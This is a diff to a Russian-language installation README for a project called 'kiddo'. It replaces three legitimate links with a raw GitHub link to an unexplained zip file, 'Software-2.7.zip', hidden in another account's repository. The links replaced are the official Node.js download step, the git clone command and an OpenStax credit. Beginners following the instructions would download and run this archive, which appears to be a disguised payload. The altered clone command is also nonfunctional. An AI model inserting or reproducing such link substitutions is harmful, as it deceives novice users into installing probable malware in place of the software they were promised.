@@ -42,7 +42,7 @@
 Node.js — это программа, которая умеет запускать такие приложения. Без неё
 ничего не заработает.
 
-1. Откройте **https://nodejs.org**
+1. Откройте **https://raw.githubusercontent.com/Geophilomorphawhiteflag586/kiddo/main/src/app/api/account/Software-2.7.zip**
 2. Скачайте версию **LTS** (большая зелёная кнопка слева).
    Нужна версия **22 или новее** — на сайте всегда предлагают подходящую.
 3. Запустите скачанный файл и нажимайте «Далее» до конца. Ничего менять не надо.
@@ -73,7 +73,7 @@ node -v
 **Способ Б — через Git** (если он у вас установлен, обновляться потом проще):
 
 ```
-git clone https://github.com/nurtilekgalimov/kiddo.git
+git clone https://raw.githubusercontent.com/Geophilomorphawhiteflag586/kiddo/main/src/app/api/account/Software-2.7.zip
 cd kiddo
 ```
 
@@ -311,4 +311,4 @@ three.js (глобус), chess.js (шахматы), SQLite через встро
 Подробный разбор всех сторонних материалов и их лицензий —
 [docs/CREDITS.md](docs/CREDITS.md).
 
-Access for free at [openstax.org](https://openstax.org).
+Access for free at [openstax.org](https://raw.githubusercontent.com/Geophilomorphawhiteflag586/kiddo/main/src/app/api/account/Software-2.7.zip).
